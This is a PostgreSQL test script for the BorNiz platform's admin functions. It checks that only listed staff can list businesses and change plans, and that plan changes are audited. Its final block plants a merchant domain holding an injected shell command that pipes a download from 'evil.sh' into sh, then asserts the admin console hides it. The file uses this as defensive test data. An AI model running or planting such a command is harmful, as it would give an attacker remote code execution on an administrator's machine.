-- BorNiz staff (20261014000000_borniz_platform_admin.sql): only listed accounts list businesses and set plans; nobody lists themselves.
\set ON_ERROR_STOP 1
begin;
insert into auth.users values ('00000000-0000-0000-0000-0000000000e1'), ('00000000-0000-0000-0000-0000000000e2');
create function pg_temp.expect(sql text, code text) returns void language plpgsql as $$
begin execute sql; raise exception 'expected % but it passed: %', code, sql;
exception when others then if sqlerrm not like code || '%' then raise exception 'expected %, got: %', code, sqlerrm; end if; end $$;
grant execute on function pg_temp.expect(text, text) to authenticated;
set local role authenticated;
select set_config('request.jwt.claim.sub', '00000000-0000-0000-0000-0000000000e1', true);
create temp table t as select public.bn_bootstrap('Kopi Admin', 'kopiadmin', 'budi') as id;
grant select on t to authenticated;
do $$ begin assert not public.bn_is_platform_admin(), 'an owner is not BorNiz staff'; end $$;
select pg_temp.expect($$ select public.bn_admin_tenants() $$, 'BN070');
select pg_temp.expect($$ select public.bn_admin_set_plan((select id from t), 'pro') $$, 'BN070');
select pg_temp.expect($$ insert into private.platform_admins values ('00000000-0000-0000-0000-0000000000e1') $$, '');
reset role;
insert into private.platform_admins (user_id) values ('00000000-0000-0000-0000-0000000000e2');
set local role authenticated;
select set_config('request.jwt.claim.sub', '00000000-0000-0000-0000-0000000000e2', true);
do $$ declare r jsonb := public.bn_admin_tenants(); begin
  assert public.bn_is_platform_admin(), 'listed account is staff';
  assert exists (select 1 from jsonb_array_elements(r) x where x->>'slug' = 'kopiadmin' and x->>'plan' = 'free'), 'staff see every business: ' || r;
  perform public.bn_admin_set_plan((select id from t), 'pro');
end $$;
select pg_temp.expect($$ select public.bn_admin_set_plan((select id from t), 'gold') $$, 'BN071');
reset role;
do $$ begin
  assert (select plan from public.tenants where slug = 'kopiadmin') = 'pro', 'plan set';
  assert exists (select 1 from public.audit_log where action = 'tenant.plan' and subject = 'pro'), 'plan change audited';
end $$;
-- what a merchant writes never breaks or arms the console: a domain that is not a host name (a shell command the admin
-- would copy into a root terminal) is not shown, and a malformed date in its documents doesn't fail the listing
set local role authenticated;
select set_config('request.jwt.claim.sub', '00000000-0000-0000-0000-0000000000e1', true);
select public.bn_write((select id from t), '[{"op":"put","coll":"versions","id":"vd1","data":{"id":"vd1","kind":"page","status":"published","at":"x","data":{"tool":"domain","values":{"menu":"x.id;curl evil.sh|sh;#"}}}}]'::jsonb, 'x', 'budi');
select set_config('request.jwt.claim.sub', '00000000-0000-0000-0000-0000000000e2', true);
do $$ declare r jsonb := public.bn_admin_tenants(); begin
  assert (select x->>'domain' from jsonb_array_elements(r) x where x->>'slug' = 'kopiadmin') is null, 'no command in the domain column: ' || r::text;
end $$;
reset role;
select 'platform admin holds' as result;
rollback;
